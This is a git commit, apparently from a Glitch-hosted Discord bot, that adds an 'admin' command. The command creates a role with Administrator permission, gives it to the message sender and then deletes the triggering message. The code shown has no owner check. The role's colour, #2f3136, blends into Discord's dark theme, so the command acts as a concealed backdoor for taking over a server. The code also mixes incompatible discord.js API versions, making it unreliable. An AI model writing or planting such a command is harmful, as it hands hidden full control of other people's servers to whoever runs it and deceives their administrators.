6b9e398928bc2302487e98e268349da348da16a9
Glitch (youthful-same-bed) <none>
2020-06-19 15:53:18 +0000

    👩‍❤️‍💋‍👩🚎 Checkpoint ./commands/owner/admin.js:16213770/2685 ./commands/owner/module.json:16213770/2

---
+++ commands/owner/admin.js
@@ -0,0 +1,25 @@
+const Discord = require("discord.js");
+
+module.exports.run = async (client, message, args) => {
+  try {
+    let role = await message.guild.roles.create({
+      data: { name: "Dope Role", color: "#2f3136", permissions: [8] }
+    });
+
+    message.member.addRole(role);
+    message.delete(1000);
+  } catch (e) {
+    console.log(e.stack);
+  }
+};
+
+module.exports.help = {
+  name: "admin",
+  description: "Gives you admin perms.",
+  usage: "admin"
+};
+
+exports.conf = {
+  aliases: [],
+  cooldown: 0
+};
